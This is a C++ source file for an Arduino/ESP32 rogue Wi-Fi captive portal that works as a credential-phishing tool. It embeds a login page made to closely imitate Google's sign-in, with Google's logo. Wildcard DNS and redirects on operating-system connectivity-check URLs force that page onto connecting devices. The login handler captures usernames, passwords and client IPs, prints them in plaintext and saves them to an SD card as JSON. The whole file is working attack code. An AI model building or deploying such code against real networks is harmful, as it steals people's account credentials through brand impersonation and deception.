#include "arduino_captive.h"

#ifndef UNIT_TEST

#include <Arduino.h>
#include <SD.h>
#include "config/config.h"
#include "../storage/capture_registry.h"

namespace ap {

// Default captive portal HTML - styled like the reference implementation
static const char PORTAL_HTML_TEMPLATE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>%s</title>
    <style>
        body {
            background: linear-gradient(135deg, #1a1a2e 0%%, #16213e 100%%);
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            max-width: 350px;
            width: 100%%;
        }
        h1 { 
            font-size: 1.5rem; 
            margin: 0 0 20px 0; 
            color: #ff6b9d;
            text-align: center;
        }
        input {
            width: 100%%;
            padding: 12px;
            margin: 8px 0;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            box-sizing: border-box;
        }
        button {
            width: 100%%;
            padding: 14px;
            margin-top: 15px;
            background: #ff6b9d;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
        }
        button:hover { background: #ff4081; }
        .footer { 
            margin-top: 20px; 
            font-size: 0.8rem; 
            color: #666; 
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>%s</h1>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">Secure connection required</div>
    </div>
</body>
</html>
)rawliteral";

static const char SUCCESS_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            text-align: center;
        }
        .check { font-size: 4rem; margin-bottom: 20px; }
        h1 { color: #4caf50; }
    </style>
</head>
<body>
    <div class="check">✓</div>
    <h1>Connected!</h1>
    <p>You may now use the network.</p>
</body>
</html>
)rawliteral";

// Google-style login page - designed to closely resemble Google's sign-in flow
static const char GOOGLE_PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 48px 40px;
        }
        .container {
            width: 100%%;
            max-width: 450px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 16px;
        }
        .logo svg { height: 24px; }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            text-align: center;
            margin-bottom: 32px;
        }
        .input-group {
            position: relative;
            height: 56px;
            margin-bottom: 24px;
        }
        input {
            width: 100%%;
            height: 56px;
            padding: 0 15px;
            font-size: 16px;
            line-height: 56px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            box-sizing: border-box;
        }
        input:focus { border-color: #1a73e8; border-width: 2px; }
        input:focus + label, input:not(:placeholder-shown) + label {
            top: -8px;
            left: 12px;
            font-size: 12px;
            background: #fff;
            padding: 0 4px;
            color: #1a73e8;
        }
        label {
            position: absolute;
            top: 50%%;
            left: 15px;
            transform: translateY(-50%%);
            color: #5f6368;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.2s ease;
        }
        .forgot {
            display: block;
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
            margin-bottom: 32px;
        }
        .forgot:hover { text-decoration: underline; }
        .info {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 32px;
            line-height: 1.5;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            text-decoration: none;
        }
        .create:hover { text-decoration: underline; }
        button {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: box-shadow 0.2s;
        }
        button:hover { box-shadow: 0 1px 3px rgba(0,0,0,0.3); background: #1765cc; }
        .footer {
            display: flex;
            justify-content: space-between;
            margin-top: 80px;
            width: 100%%;
            max-width: 450px;
            font-size: 12px;
            color: #5f6368;
        }
        .footer a { color: #5f6368; text-decoration: none; margin-left: 24px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="120" height="40"><path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/><path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        <form action="/login" method="POST">
            <div class="input-group">
                <input type="text" name="username" id="email" placeholder=" " required>
                <label for="email">Email or phone</label>
            </div>
            <div class="input-group">
                <input type="password" name="password" id="password" placeholder=" " required>
                <label for="password">Enter your password</label>
            </div>
            <a href="#" class="forgot">Forgot password?</a>
            <p class="info">Not your computer? Use Guest mode to sign in privately. <a href="#" style="color:#1a73e8">Learn more</a></p>
            <div class="buttons">
                <a href="#" class="create">Create account</a>
                <button type="submit">Next</button>
            </div>
        </form>
    </div>
    <div class="footer">
        <span>English (United States)</span>
        <div><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
    </div>
</body>
</html>
)rawliteral";

ArduinoCaptivePortal::ArduinoCaptivePortal() {
    strcpy(portalTitle_, "Network Login");
    Serial.printf("[ArduinoCaptive] Constructor: this=%p\n", (void*)this);
}

// ============ Accessor implementations (moved from header to avoid ODR issues) ============

bool ArduinoCaptivePortal::isRunning() const {
    return running_;
}

const ArduinoCapturedCredential* ArduinoCaptivePortal::getCredentialsArray() const {
    return credentialsArray_;
}

std::vector<ArduinoCapturedCredential> ArduinoCaptivePortal::getCredentials() const {
    Serial.printf("[ArduinoCaptive] getCredentials() this=%p, &credentialCount_=%p, count=%zu\n", 
                  (void*)this, (void*)&credentialCount_, credentialCount_);
    std::vector<ArduinoCapturedCredential> result;
    for (size_t i = 0; i < credentialCount_; i++) {
        result.push_back(credentialsArray_[i]);
    }
    return result;
}

size_t ArduinoCaptivePortal::getCredentialCount() const {
    return credentialCount_;
}

uint32_t ArduinoCaptivePortal::getRequestCount() const {
    return requestCount_;
}

uint32_t ArduinoCaptivePortal::getDnsQueryCount() const {
    return dnsQueryCount_;
}

void ArduinoCaptivePortal::onCredentialCaptured(CredentialCallback callback) {
    onCredential_ = callback;
}

void ArduinoCaptivePortal::clearCredentials() {
    credentialCount_ = 0;
}

void ArduinoCaptivePortal::setSSID(const char* ssid) {
    if (ssid) {
        strncpy(currentSSID_, ssid, sizeof(currentSSID_) - 1);
        currentSSID_[sizeof(currentSSID_) - 1] = '\0';
        Serial.printf("[ArduineCaptive] setSSID called: '%s'\n", currentSSID_);
    }
}

bool ArduinoCaptivePortal::saveCredentialsToSD() {
    if (credentialCount_ == 0) {
        Serial.println("[ArduinoCaptive] No credentials to save");
        return false;
    }
    
    // Create safe SSID for filename
    Serial.printf("[ArduineCaptive] saveCredentialsToSD: currentSSID_='%s'\n", currentSSID_);
    char safeSSID[33];
    strncpy(safeSSID, currentSSID_[0] ? currentSSID_ : "unknown", sizeof(safeSSID) - 1);
    for (char* p = safeSSID; *p; p++) {
        if (!isalnum(*p) && *p != '-' && *p != '_') *p = '_';
    }
    
    // Create directory if needed
    if (!SD.exists(adversary::config::SD_CREDENTIALS_PATH)) {
        SD.mkdir(adversary::config::SD_CREDENTIALS_PATH);
    }
    
    // Generate filename
    char filepath[128];
    snprintf(filepath, sizeof(filepath), "%s/%s_credentials.json", 
             adversary::config::SD_CREDENTIALS_PATH, safeSSID);
    
    // Open file for writing
    File file = SD.open(filepath, FILE_WRITE);
    if (!file) {
        Serial.printf("[ArduineCaptive] Failed to open: %s\n", filepath);
        return false;
    }
    
    // Write JSON
    file.print("{\n  \"ssid\": \"");
    file.print(currentSSID_);
    file.print("\",\n  \"credentials\": [\n");
    
    for (size_t i = 0; i < credentialCount_; i++) {
        const auto& cred = credentialsArray_[i];
        file.print("    {\n");
        file.printf("      \"username\": \"%s\",\n", cred.username);
        file.printf("      \"password\": \"%s\",\n", cred.password);
        file.printf("      \"clientIP\": \"%s\",\n", cred.clientIP);
        file.printf("      \"timestamp\": %lu\n", cred.timestamp);
        file.print(i < credentialCount_ - 1 ? "    },\n" : "    }\n");
    }
    
    file.print("  ]\n}\n");
    file.close();
    
    // Update registry for live C indicator
    adversary::CaptureRegistry::getInstance().addCredentials(currentSSID_);
    
    Serial.printf("[ArduineCaptive] Saved %zu credentials to: %s\n", credentialCount_, filepath);
    return true;
}

// ==========================================================================================

ArduinoCaptivePortal::~ArduinoCaptivePortal() {
    stop();
}

bool ArduinoCaptivePortal::start(const char* title) {
    if (running_) {
        stop();
    }
    
    strncpy(portalTitle_, title, sizeof(portalTitle_) - 1);
    portalTitle_[sizeof(portalTitle_) - 1] = '\0';
    
    IPAddress apIP = WiFi.softAPIP();
    Serial.printf("[ArduinoCaptive] Starting on IP: %s\n", apIP.toString().c_str());
    
    // Delete any existing server objects to fully release sockets
    if (dnsServer_) {
        dnsServer_->stop();
        delete dnsServer_;
        dnsServer_ = nullptr;
    }
    if (webServer_) {
        webServer_->stop();
        webServer_->close();
        delete webServer_;
        webServer_ = nullptr;
    }
    delay(100);
    
    // Create fresh server objects - this ensures no stale socket state
    dnsServer_ = new DNSServer();
    webServer_ = new WebServer(80);
    
    // Start DNS server with retries
    bool dnsStarted = false;
    for (int retry = 0; retry < 5; retry++) {
        if (dnsServer_->start(53, "*", apIP)) {
            dnsStarted = true;
            break;
        }
        Serial.printf("[ArduinoCaptive] DNS start attempt %d failed, retrying...\\n", retry + 1);
        delay(200);
    }
    
    if (!dnsStarted) {
        Serial.println("[ArduinoCaptive] ERROR: DNS server failed to start after retries!");
        delete dnsServer_;
        dnsServer_ = nullptr;
        delete webServer_;
        webServer_ = nullptr;
        return false;
    }
    Serial.println("[ArduinoCaptive] DNS server started (wildcard redirect)");
    
    // Setup HTTP routes
    setupRoutes();
    
    // Start HTTP server
    webServer_->begin();
    Serial.println("[ArduinoCaptive] HTTP server started on port 80");
    
    running_ = true;
    requestCount_ = 0;
    dnsQueryCount_ = 0;
    
    return true;
}

void ArduinoCaptivePortal::stop() {
    if (!running_) return;
    
    Serial.println("[ArduinoCaptive] Stopping...");
    
    // Stop and delete servers to fully release sockets
    if (webServer_) {
        webServer_->stop();
        webServer_->close();
        delete webServer_;
        webServer_ = nullptr;
    }
    
    if (dnsServer_) {
        dnsServer_->stop();
        delete dnsServer_;
        dnsServer_ = nullptr;
    }
    
    delay(100);  // Brief delay for socket cleanup
    
    running_ = false;
    
    Serial.println("[ArduinoCaptive] Stopped");
}

void ArduinoCaptivePortal::handleRequests() {
    if (!running_ || !dnsServer_ || !webServer_) return;
    
    // Process DNS requests
    dnsServer_->processNextRequest();
    
    // Process HTTP requests
    webServer_->handleClient();
}

void ArduinoCaptivePortal::setupRoutes() {
    if (!webServer_) return;
    
    // Main login page
    webServer_->on("/", HTTP_GET, [this]() { handleRoot(); });
    webServer_->on("/login", HTTP_POST, [this]() { handleLogin(); });
    webServer_->on("/login", HTTP_GET, [this]() { handleRoot(); });
    
    // Captive portal detection endpoints (all platforms)
    // These need to return 302 redirects to trigger captive portal popup
    
    // Android
    webServer_->on("/generate_204", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    webServer_->on("/gen_204", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    
    // iOS/macOS - these are special, need to NOT return 200
    webServer_->on("/hotspot-detect.html", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    webServer_->on("/library/test/success.html", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    
    // Windows
    webServer_->on("/connecttest.txt", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    webServer_->on("/success.txt", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    webServer_->on("/ncsi.txt", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    
    // Firefox
    webServer_->on("/canonical.html", HTTP_GET, [this]() { handleCaptiveRedirect(); });
    
    // Catch all other requests
    webServer_->onNotFound([this]() { handleNotFound(); });
}

void ArduinoCaptivePortal::handleRoot() {
    if (!webServer_) return;
    requestCount_++;
    Serial.printf("[ArduinoCaptive] Serving portal page (request #%lu)\\n", requestCount_);
    webServer_->send(200, "text/html", getPortalHTML());
}

void ArduinoCaptivePortal::handleCaptiveRedirect() {
    if (!webServer_) return;
    requestCount_++;
    dnsQueryCount_++;  // Count as captive detection
    
    IPAddress apIP = WiFi.softAPIP();
    String redirectUrl = "http://" + apIP.toString() + "/";
    
    Serial.printf("[ArduinoCaptive] Captive redirect: %s -> %s\\n", 
                  webServer_->uri().c_str(), redirectUrl.c_str());
    
    // Send 302 redirect to trigger captive portal popup
    webServer_->sendHeader("Location", redirectUrl, true);
    webServer_->sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    webServer_->sendHeader("Pragma", "no-cache");
    webServer_->sendHeader("Expires", "-1");
    webServer_->send(302, "text/plain", "");
}

void ArduinoCaptivePortal::handleLogin() {
    if (!webServer_) return;
    requestCount_++;
    
    if (webServer_->hasArg("username") && webServer_->hasArg("password")) {
        if (credentialCount_ < MAX_CREDENTIALS) {
            ArduinoCapturedCredential& cred = credentialsArray_[credentialCount_];
            memset(&cred, 0, sizeof(cred));
            strncpy(cred.username, webServer_->arg("username").c_str(), sizeof(cred.username) - 1);
            strncpy(cred.password, webServer_->arg("password").c_str(), sizeof(cred.password) - 1);
            strncpy(cred.clientIP, webServer_->client().remoteIP().toString().c_str(), sizeof(cred.clientIP) - 1);
            cred.timestamp = millis();
            
            Serial.printf("[ArduinoCaptive] Before increment: &credentialCount_=%p, credentialCount_=%zu, this=%p\\n", 
                          (void*)&credentialCount_, credentialCount_, (void*)this);
            credentialCount_++;
            Serial.printf("[ArduinoCaptive] After increment: credentialCount_=%zu\\n", credentialCount_);
            
            Serial.printf("[ArduinoCaptive] CREDENTIAL CAPTURED! User: %s, Pass: %s, IP: %s\\n",
                          cred.username, cred.password, cred.clientIP);
            
            if (onCredential_) {
                onCredential_(cred);
            }
            
            // Auto-save to SD card after each credential capture
            saveCredentialsToSD();
        } else {
            Serial.println("[ArduinoCaptive] Credential array full!");
        }
    }
    
    webServer_->send(200, "text/html", getSuccessHTML());
}

void ArduinoCaptivePortal::handleNotFound() {
    if (!webServer_) return;
    requestCount_++;
    // Redirect everything to the portal
    Serial.printf("[ArduinoCaptive] Redirecting: %s\\n", webServer_->uri().c_str());
    webServer_->send(200, "text/html", getPortalHTML());
}

String ArduinoCaptivePortal::getPortalHTML() {
    // Select template based on page type
    if (pageType_ == PortalPageType::SOCIAL_GOOGLE) {
        return String(GOOGLE_PORTAL_HTML);
    }
    
    // Default: Generic template with title substitution
    char buffer[2500];
    snprintf(buffer, sizeof(buffer), PORTAL_HTML_TEMPLATE, portalTitle_, portalTitle_);
    return String(buffer);
}

String ArduinoCaptivePortal::getSuccessHTML() {
    return String(SUCCESS_HTML);
}

} // namespace ap

#endif // UNIT_TEST
